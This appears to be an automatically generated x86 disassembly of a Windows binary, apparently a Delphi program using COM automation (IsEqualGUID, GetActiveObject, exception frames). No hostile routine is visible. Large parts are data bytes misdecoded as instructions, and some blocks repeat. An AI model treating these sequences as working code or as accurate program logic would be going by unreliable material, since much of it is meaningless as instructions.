add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ eax - 0x15 ] bh
inc esi
add al al
test al 0x41
add [ eax - 0x1 ] dl
inc ecx
add ah bl
cmpsd [ esi ] [ edi ]
inc ecx
add al cl
jmp r-xdata
add [ eax - 0x80000000 ] al
add al 0x0
adc [ edx + 0x65 ] edx
insd
jb r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jle r-xdata
lea ecx [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
mov eax ebx
add eax eax
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
lea esi [ edx + eax * 8 ]
mov eax [ ebp - 0x10 ]
sub eax ebx
add eax eax
mov edx [ ebp - 0x4 ]
lea eax [ edx + eax * 8 ]
mov edx esi
call sub_40f510
inc ebx
dec edi
jne r-xdata
mov eax ebx
add eax eax
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
lea esi [ edx + eax * 8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + ebx * 4 ]
add eax eax
mov edx [ ebp - 0x4 ]
lea eax [ edx + eax * 8 ]
mov edx esi
call sub_40f510
inc ebx
dec edi
jne r-xdata
jmp r-xdata
out 0x46 al
add ch cl
in eax 0x46
jb r-xdata
push esi
call IsEqualGUID
test al al
je r-xdata
dec ebp
popad
arpl [ eax + 0x69 ] bp
outsd
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x52110004 ] al
insd
out 0x46 eax
add [ eax ] al
mov [ ecx ] es
add eax 0x6c4f0900
push ebx
jb r-xdata
mov ebx [ ebp - 0xc ]
mov edi [ ebp - 0x10 ]
sub edi ebx
jl r-xdata
mov ebx [ ebp - 0xc ]
mov edi [ ebp - 0x10 ]
sub edi ebx
jl r-xdata
int 0xe5
inc esi
popad
arpl [ ebp + 0x9 ] sp
dec edi
insb
push ebx
jb r-xdata
mov eax 0x80004002
mov ecx edi
mov edx sub_46e8f4
mov eax ebx
call sub_403300
xor eax eax
jmp r-xdata
outsb
dec esi
popad
insd
mov eax eax
jb r-xdata
push 0x0
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405200
add esp 0x4
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46eb09
inc edi
inc edi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
inc eax
add [ ebp + ebp * 8 - 0x125bffba ] cl
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x410b0002 ] al
jne r-xdata
add [ eax ] al
adc [ eax ] al
mov ebp gs
inc esi
add [ ebp + ebp * 8 + 0x10046 ] ah
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
or eax [ ecx + 0x75 ]
je r-xdata
inc ebx
dec edi
jne r-xdata
mov eax esi
mov edx [ ebp - 0x10 ]
sub edx ebx
add edx edx
mov ecx [ ebp - 0x4 ]
lea edx [ ecx + edx * 8 ]
call sub_40f510
inc ebx
dec edi
jne r-xdata
mov eax esi
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x4 ]
mov edx [ edx + ebx * 4 ]
add edx edx
mov ecx [ ebp - 0x4 ]
lea edx [ ecx + edx * 8 ]
call sub_40f510
je r-xdata
outsd
add [ eax ] al
test dl dl
inc ebx
outsd
outsb
outsb
arpl [ gs : esp + edx * 2 - 0x1b ] si
inc esi
add [ ebp + ebp * 8 + 0x46 ] dh
add [ eax + 0x10046ed ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0003 ] al
outsd
outsb
outsb
arpl [ gs : ebx + ecx * 2 + 0x69 ] si
outsb
mov eax ebx
add eax eax
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
lea esi [ edx + eax * 8 ]
mov ax [ esi ]
and ax 0x4000
cmp ax 0x4000
jne r-xdata
mov eax ebx
add eax eax
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
lea esi [ edx + eax * 8 ]
mov ax [ esi ]
and ax 0x4000
cmp ax 0x4000
jne r-xdata
jmp r-xdata
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_46e5ff
add [ esp + 0x4 ] 0xfffffff4
jmp r-xdata
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
inc [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
pop ebx
pop ebp
retn 0x4
push eax
call sub_46edd0
sub_46e7ab
add [ edx + ebp + 0x40 ] al
add [ edx + ebp + 0x40 ] al
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah dh
adc [ eax ] al
inc esp
add [ eax ] al
hlt
jb r-xdata
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
js r-xdata
inc eax
add al bl
out 0x46 eax
add [ edi ] al
or dl [ edi + ecx * 2 + 0x6c ]
push ebx
jb r-xdata
cld
inc ecx
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ eax - 0x15 ] bh
inc esi
add al al
test al 0x41
add [ eax - 0x1 ] dl
inc ecx
add ah bl
cmpsd [ esi ] [ edi ]
inc ecx
add al cl
jmp r-xdata
add [ eax - 0x80000000 ] al
add al 0x0
adc [ edx + 0x65 ] edx
insd
jb r-xdata
add [ edx ] cl
push esp
dec edi
insb
push ebx
jb r-xdata
push esi
call IsEqualGUID
test al al
je r-xdata
dec ebp
popad
arpl [ eax + 0x69 ] bp
outsd
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x52110004 ] al
insd
out 0x46 eax
add [ eax ] al
mov [ ecx ] es
add eax 0x6c4f0900
push ebx
jb r-xdata
mov eax 0x80004002
mov ecx edi
mov edx sub_46e8f4
mov eax ebx
call sub_403300
xor eax eax
jmp r-xdata
outsb
dec esi
popad
insd
mov eax eax
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
inc eax
add [ ebp + ebp * 8 - 0x125bffba ] cl
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x410b0002 ] al
jne r-xdata
add [ eax ] al
adc [ eax ] al
mov ebp gs
inc esi
add [ ebp + ebp * 8 + 0x10046 ] ah
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
or eax [ ecx + 0x75 ]
je r-xdata
je r-xdata
outsd
add [ eax ] al
test dl dl
inc ebx
outsd
outsb
outsb
arpl [ gs : esp + edx * 2 - 0x1b ] si
inc esi
add [ ebp + ebp * 8 + 0x46 ] dh
add [ eax + 0x10046ed ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0003 ] al
outsd
outsb
outsb
arpl [ gs : ebx + ecx * 2 + 0x69 ] si
outsb
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_46e89e
mov eax eax
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_403300
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x30 ]
add eax 0x20
push eax
push esi
call IsEqualGUID
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax 0x80004002
mov ecx edi
mov edx sub_46e8f4
mov eax ebx
call sub_403300
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_46e8f4
add [ edx + eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
inc [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
pop ebx
pop ebp
retn 0x4
push eax
call sub_46edd0
sub_46e924
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
dec [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
pop ebx
pop ebp
retn 0x4
push eax
call sub_46ede0
sub_46eb24
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41fbd8
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ esi + 0x30 ]
inc [ eax + 0x38 ]
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_46e874
mov [ esi + 0x38 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax esi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_46eb78
push ebx
push esi
call sub_4035d8
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ esi + 0x38 ]
call sub_46eb14
mov eax [ esi + 0x38 ]
push eax
call sub_46e924
test eax eax
jne r-xdata
mov eax [ esi + 0x30 ]
dec [ eax + 0x38 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41fc24
test bl bl
jle r-xdata
mov eax [ esi + 0x38 ]
call sub_40324c
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
sub_46ebc8
push ebx
mov ebx eax
mov eax ebx
call sub_420028
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_46ed8c
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
sub_46ebf0
push ebp
mov ebp esp
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46ed3a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_46ed74
sub al 0x1
jb r-xdata
mov eax esi
call sub_4059cc
push eax
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call GetActiveObject
call sub_41774c
test al al
jne r-xdata
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ed41
lea eax [ ebp - 0x24 ]
call sub_4046a8
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_403fc0
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_462fdc
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_462fdc
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_4059cc
push eax
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call GetActiveObject
mov esi eax
mov eax esi
call sub_41774c
test al al
jne r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x18 ]
mov eax [ ebx + 0x30 ]
call sub_462fb0
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x30 ]
call sub_462f84
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405eac
mov eax [ ebp - 0x20 ]
mov ecx 0x1
pop edx
call sub_408fcc
push esi
push 0x0
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_462de8
call sub_4039d8
jmp r-xdata
lea eax [ ebp - 0x24 ]
mov edx [ ebx + 0x44 ]
call sub_4047f4
mov eax [ ebp - 0x24 ]
mov ecx esi
mov edx [ ebx + 0x30 ]
call sub_463014
jmp r-xdata
sub_46eda8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_403300
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_46edf0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46ee15
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ee1c
retn
sub_46ee3a
mov eax eax
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_4039a0#6
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ee68
retn
sub_46ee76
inc esi
add [ edi ] cl
or al 0x5f
inc ecx
jo r-xdata
jae r-xdata
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
aam 0x11
inc eax
add [ ecx ] al
add [ eax ] esi
push es
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
or [ edi + 0x75 ] ecx
je r-xdata
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
or [ edi + 0x75 ] ecx
je r-xdata
adc [ eax ] eax
add [ eax + 0x630 ] eax
pop eax
push eax
or [ eax ] al
outsd
outsd
imul ebx [ eax + 0x50 ] 0x1c
add bh bh
dec [ ebp - 0x114fffc0 ]
inc esi
add [ edi ] cl
push es
push ebx
popad
jb r-xdata
outsd
outsd
imul ebx [ eax + 0x50 ] 0xf
add bh bh
call [ eax + r-xdata ]
outsd
outsd
imul ebx [ eax + 0x50 ] 0xb
add bh bh
call [ eax + r-xdata ]
prefetchwt1 [ eax + 0x72 ]
outsd
jo r-xdata
outsd
imul ebx [ eax + 0x50 ] 0x15
add edi edi
dec [ ebp - 0x107bffc0 ]
inc esi
add [ edi ] cl
or eax 0x7369445f
je r-xdata
outsd
outsd
imul ebx [ eax + 0x50 ] 0x8
add bh bh
dec [ ebx + 0x46ef18c0 ]
add [ edi ] cl
or al [ ecx + 0x74 ]
je r-xdata
inc ecx
je r-xdata
push r-xdata
add [ ebx ] ecx
xor [ esi ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ fs : ebx ] al
or [ edi ] al
inc ecx
push ebx
outsb
imul esi [ ebx + 0x74 ] 0x6d657449
add [ edi + ebp * 8 + 0xd0f0046 ] al
pop edi
inc esp
imul esi [ ebx + 0x74 ] 0x7473694c
dec ecx
je r-xdata
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
aam 0x11
inc eax
add [ ecx ] al
xor [ eax ] 0x6
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
or [ edi + 0x75 ] ecx
je r-xdata
insd
popad
add [ ecx ] al
and [ eax ] esi
push es
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
or [ edi + 0x75 ] ecx
je r-xdata
jns r-xdata
or al [ ecx + ecx * 2 ]
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0x4 ] si
dec ecx
add [ ebx + 0x46f020c0 ] cl
outsd
outsd
imul ebx [ eax + 0x50 ] 0x45
jo r-xdata
insd
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
or [ edi + 0x75 ] ecx
je r-xdata
adc [ eax ] eax
add [ edi ] eax
xor [ esi ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
or [ edi + 0x75 ] ecx
je r-xdata
jb r-xdata
outsb
outsd
jne r-xdata
popad
jae r-xdata
or [ ecx + 0x44 ] ecx
imul esi [ ebx + 0x70 ] 0x68637461
add [ ecx + edx + 0x11d40040 ] al
inc eax
add [ ebp - 0xf8fffc0 ] cl
insd
or [ ecx + 0x44 ] ecx
imul esi [ ebx + 0x70 ] 0x68637461
add [ esi ] eax
inc ebx
popad
add [ fs : edx ] al
outsd
outsd
imul eax [ ecx + 0x70 ] 0x70
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
push edx
insd
imul ebp [ esi + 0x64 ] 0x2007265
or [ edi ] al
arpl [ ecx + 0x74 ] sp
imul ebp [ edi + 0x6e ] 0x696d6552
outsd
outsd
imul eax [ ecx + 0x70 ] 0x70
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
dec ecx
je r-xdata
jae r-xdata
je r-xdata
jne r-xdata
add bh bh
dec [ ebx + 0x46efbcc0 ]
add [ eax ] cl
sbb edx [ edi + ecx * 2 + 0x75 ]
je r-xdata
push eax
inc ebp
insb
jbe r-xdata
outsd
outsd
imul eax [ ecx + 0x70 ] 0x70
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
dec edi
jo r-xdata
add [ eax ] cl
sbb edx [ edi + ecx * 2 + 0x75 ]
je r-xdata
inc edx
outsd
outsd
insb
add [ ecx + edx + 0x11d40040 ] al
inc eax
add ah cl
adc [ eax ] al
mov eax eax
and al dh
inc esi
or al [ 0x65676150 ]
jae r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0x5 ] si
push eax
popad
jae r-xdata
or al [ ecx + ecx * 2 ]
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0x4 ] si
dec ecx
inc ecx
push ebx
outsb
jb r-xdata
add cl [ eax ]
pop es
outsb
jb r-xdata
insd
push ebx
outsb
or [ ecx ] ch
push esp
dec edi
jne r-xdata
popad
je r-xdata
arpl [ eax ] bp
test [ ecx ] dl
inc eax
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
push 0x61430601
or [ ebx ] bl
push esp
dec edi
jne r-xdata
insb
arpl [ ebp + 0x64 ] sp
push ebx
popad
jb r-xdata
outsb
arpl [ ebp + 0x64 ] sp
push ebx
popad
jb r-xdata
push ebx
outsb
jb r-xdata
imul ebp [ edi + 0x6e ] 0x67615073
jae r-xdata
add [ ecx + edx - 0x1123ffc0 ] al
push eax
jb r-xdata
jae r-xdata
insd
insb
inc esi
add [ ebp - 0xf33ffc0 ] cl
inc esi
add [ eax ] cl
sub [ edi + ecx * 2 + 0x75 ] edx
je r-xdata
out dx al
add ah dl
adc [ eax ] eax
lea eax [ eax ]
jo r-xdata
push 0x40118400
inc esi
add [ eax ] cl
and dl [ edi + ecx * 2 + 0x75 ]
je r-xdata
outsb
jb r-xdata
insb
out 0x46 eax
add [ eax + 0x3 ] cl
inc edx
add [ eax - 0x63ffbfcc ] ah
cld
inc ecx
add [ eax - 0x63ffbfcc ] ch
push 0x706f7453
jo r-xdata
outsd
jo r-xdata
push 0x706d6f43
insb
je r-xdata
or cl [ ebx + edx * 2 ]
popad
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
outsd
outsd
imul eax [ ecx + 0x70 ] 0x70
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
inc ecx
jbe r-xdata
or [ edi ] al
inc ecx
push ebx
add [ fs : edx ] al
outsd
outsb
adc [ eax ] eax
lodsb [ esi ]
out dx al
inc esi
add [ ecx + esi * 8 ] ch
jo r-xdata
test [ ecx ] dl
inc eax
add ah bl
add [ ebx ] dl
push esp
dec edi
jne r-xdata
add eax 0xa8c00047
inc ecx
inc eax
add [ esp + edi * 8 + 0x34a80041 ] bl
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
in al dx
add [ fs : edx ] al
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add ah ch
pushfd
or [ edi ] al
inc ecx
push ebx
add [ fs : edx ] al
outsb
jb r-xdata
add [ edx ] al
or [ edi ] al
inc ecx
arpl [ gs : esi + eax + 0x53 ] si
push 0x656a624f
arpl [ esi + eax + 0x53 ] si
add [ eax ] al
sub dh dl
inc esi
outsb
add [ eax + 0x24000000 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] ch
inc esi
inc ecx
jbe r-xdata
outsd
outsd
imul eax [ ecx + 0x70 ] 0x70
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
popad
jb r-xdata
push ebx
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0006 ] al
outsb
dec ecx
je r-xdata
insb
outsd
outsd
imul eax [ ecx + 0x70 ] 0x70
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
mov eax eax
inc esp
inc esi
add [ edi ] al
adc edx [ edi + ecx * 2 + 0x75 ]
je r-xdata
or cl [ ebx + edx * 2 ]
popad
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0xc ] si
push ebx
enter 0x46eb 0x0
hlt
push 0x40118400
add [ esi + ebp * 8 - 0x2b6fffba ] ch
int1
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
inc esi
add [ edx + esi * 8 + 0x46 ] al
add [ eax ] al
add [ eax ] al
inc eax
inc esi
add [ eax ] cl
sub [ edi + ecx * 2 + 0x75 ] dl
je r-xdata
push 0x40118400
add [ esi + ebp * 8 - 0xed3ffba ] ch
jns r-xdata
or [ ecx ] 0x0
adc [ edi + 0x6e ] ecx
insd
push ebx
outsb
dec esp
jns r-xdata
dec esp
outsd
outsd
imul eax [ ecx + 0x70 ] 0x70
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
aam 0xf1
inc esi
add ah dl
out 0x46 eax
add [ edi ] cl
add [ ecx ] cl
dec edi
jne r-xdata
add [ eax - 0x1 ] dl
inc ecx
add ah bl
cmpsd [ esi ] [ edi ]
inc ecx
add al cl
jmp r-xdata
add al al
test al 0x41
popad
jb r-xdata
push 0x656a624f
arpl [ esi + eax + 0x53 ] si
arpl [ edx + ecx + 0xc ] si
push ebx
popad
jae r-xdata
push ebx
popad
jb r-xdata
imul ebp [ edi + 0x6e ] 0x67615073
jae r-xdata
dec edi
jo r-xdata
imul ebp [ esi + 0x64 ] 0xf06c7265
inc esi
add [ eax ] ch
add bh bh
push 0x1ff0000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f110009 ] al
outsb
add [ eax ] bl
add bh bh
pop eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090007 ] al
outsb
dec esi
ja r-xdata
sbb al 0xf0
inc esi
add [ eax ] ah
insb
outsd
outsd
imul ebx [ eax + 0x50 ] 0xa
add [ eax ] al
adc [ eax ] al
cwde
add [ eax ] al
[ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x41080005 ] al
jne r-xdata
insd
jo r-xdata
push 0x706d6f43
insb
je r-xdata
dec edi
outsb
push ecx
jne r-xdata
dec esp
jns r-xdata
popad
jae r-xdata
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0008 ] al
outsb
push edx
insd
popad
imul ebp [ esp + ebx - 0x10 ] 0x600046
outsd
push ecx
jne r-xdata
outsb
je r-xdata
adc [ ebx + eax * 2 + 0x6f ] dl
outsb
je r-xdata
sub cl dh
inc esi
add [ eax - 0x77010000 ] cl
add [ eax - 0x6f010000 ] dl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f13000e ] al
outsb
dec ebp
inc ecx
push eax
dec ecx
dec esp
outsd
outsd
outsb
inc ebx
outsd
je r-xdata
add [ eax ] dh
add bh bh
jo r-xdata
insd
je r-xdata
or al [ esi ]
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
or [ ecx + 0x44 ] ecx
imul esi [ ebx + 0x70 ] 0x68637461
or cl [ eax ]
push edx
jae r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0x6 ] si
jb r-xdata
pop es
inc ecx
push ebx
outsb
or ah dh
inc esi
add [ eax ] cl
pop es
arpl [ ecx + ecx * 2 + 0x74 ] si
insd
dec edi
jo r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
outsb
arpl [ ebp + 0x64 ] sp
push ebx
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or al [ eax ]
or [ edi + 0x6e ] ecx
push ebx
je r-xdata
add bh bh
add [ eax ] eax
out dx eax
inc esi
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
insd
or dl [ gs : edi + 0x69 ]
push ebx
je r-xdata
outsd
outsb
jae r-xdata
imul ebp [ edi + 0x6e ] 0x69444909
jae r-xdata
outsb
push 0x61430601
inc edx
outsd
outsd
insb
add [ ecx + edx + 0x10cc0040 ] al
inc eax
add [ eax + r-xdata ] dl
or [ eax ] bl
push esp
inc ebx
outsd
outsb
je r-xdata
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
push 0x706f7453
jo r-xdata
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f17000d ] al
jb r-xdata
adc [ ebx + eax * 2 + 0x6f ] edx
outsb
je r-xdata
imul ebp [ esi + 0x67 ] 0x40118400
add [ eax ] al
adc [ eax ] eax
nop
sbb al 0xf5
inc esi
add [ eax ] cl
adc edx [ ebx + eax * 2 + 0x6f ]
arpl [ gs : edx + eax + 0x4 ] si
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
or [ ecx + 0x44 ] ecx
imul esi [ ebx + 0x70 ] 0x68637461
add [ esi ] eax
inc ebx
popad
dec esi
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + eax + 0x4 ] si
popad
je r-xdata
inc ebx
popad
add [ esi ] eax
outsb
je r-xdata
adc [ eax ] eax
add [ ecx ] dl
inc eax
add [ eax + r-xdata ] dl
or [ ebx ] dl
push esp
inc ebx
outsd
inc edx
outsd
outsd
insb
add [ ecx + edx + 0x11d40040 ] al
inc eax
add ah dl
adc [ eax ] eax
int3
aam 0x11
arpl [ ecx + ecx * 2 + 0x74 ] si
insd
inc ebx
jne r-xdata
dec esp
jns r-xdata
jbe r-xdata
jne r-xdata
jb r-xdata
arpl [ ecx + ecx * 2 + 0x74 ] si
insd
je r-xdata
arpl [ ecx + ecx * 2 + 0x74 ] si
pop es
push 0x6552080a
jae r-xdata
arpl [ ecx + ecx * 2 + 0x74 ] si
insd
inc ebx
jne r-xdata
je r-xdata
add [ edx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
outsb
inc ecx
dec esp
jns r-xdata
add al [ esi + ecx * 2 ]
popad
insd
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + eax + 0x4 ] si
dec esi
or dl [ gs : edi + 0x69 ]
push ebx
je r-xdata
add [ edx ] al
or [ edi ] al
inc ecx
push ebx
outsd
je r-xdata
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
popad
jb r-xdata
popad
add al [ esi + ecx * 2 ]
push esp
or [ fs : ecx + 0x44 ] ecx
je r-xdata
je r-xdata
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax + ecx ] al
add [ eax ] bh
add bh bh
js r-xdata
inc ebx
outsd
outsb
je r-xdata
imul ebp [ esi + 0x67 ] 0x40118400
add [ eax ] al
adc [ eax ] eax
lea eax [ eax ]
adc dh dh
inc esi
add [ eax ] cl
adc [ ebx + eax * 2 + 0x6f ] edx
add [ esi ] eax
inc ebx
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
push edx
jae r-xdata
jb r-xdata
je r-xdata
inc ebx
insb
outsd
jae r-xdata
insd
outsb
je r-xdata
inc ebx
outsd
inc edx
outsd
outsb
jb r-xdata
add [ ebx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
arpl [ ecx + ecx * 2 + 0x74 ] si
insd
push eax
jb r-xdata
inc edx
outsd
outsd
insb
add [ ecx + edx + 0x11d40040 ] al
popad
jb r-xdata
insd
push eax
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or eax [ eax ]
push es
je r-xdata
arpl [ ecx + ecx * 2 + 0x74 ] si
insd
push edx
jo r-xdata
insd
arpl [ ecx + ecx * 2 + 0x74 ] si
insd
popad
outsd
outsb
jae r-xdata
push 0x61430601
jns r-xdata
add al 0x4e
outsb
jb r-xdata
or al [ edi ]
inc esi
outsd
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0x7 ] si
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
or [ ecx + 0x44 ] ecx
imul esi [ ebx + 0x70 ] 0x68637461
add [ esi ] eax
inc ebx
popad
jo r-xdata
inc eax
add ah cl
adc [ eax ] al
lea eax [ eax ]
jl r-xdata
inc esi
